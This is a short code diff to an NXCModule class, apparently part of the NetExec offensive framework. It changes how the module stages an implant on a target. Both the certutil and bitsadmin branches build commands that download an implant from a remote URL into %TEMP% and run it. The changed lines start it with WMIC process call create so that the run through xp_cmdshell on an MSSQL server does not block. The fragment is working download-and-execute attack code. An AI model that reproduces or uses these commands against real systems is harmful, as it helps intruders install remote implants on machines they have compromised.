@@ -1365,17 +1365,23 @@ class NXCModule:
                 )
                 context.log.debug(f"Using PowerShell staging method")
             elif self.staging_method == "certutil":
-                # Certutil download + execute
+                # Certutil download + execute with WMIC for true async
+                # WMIC process call create is fire-and-forget - returns immediately
+                # This prevents xp_cmdshell from blocking for 2+ minutes
                 cmd = (
                     f'cmd /c certutil -urlcache -f {download_url} '
-                    f'%TEMP%\\{implant_name} && start "" /b cmd /c %TEMP%\\{implant_name}'
+                    f'%TEMP%\\{implant_name} && '
+                    f'WMIC process call create "%TEMP%\\{implant_name}"'
                 )
                 context.log.debug(f"Using certutil staging method")
             elif self.staging_method == "bitsadmin":
-                # BITSAdmin download + execute
+                # BITSAdmin download + execute with WMIC for true async
+                # WMIC process call create is fire-and-forget - returns immediately
+                # This prevents xp_cmdshell from blocking for 2+ minutes
                 cmd = (
                     f'cmd /c bitsadmin /transfer job /download /priority high '
-                    f'{download_url} %TEMP%\\{implant_name} && start "" /b cmd /c %TEMP%\\{implant_name}'
+                    f'{download_url} %TEMP%\\{implant_name} && '
+                    f'WMIC process call create "%TEMP%\\{implant_name}"'
                 )
                 context.log.debug(f"Using bitsadmin staging method")
             else:
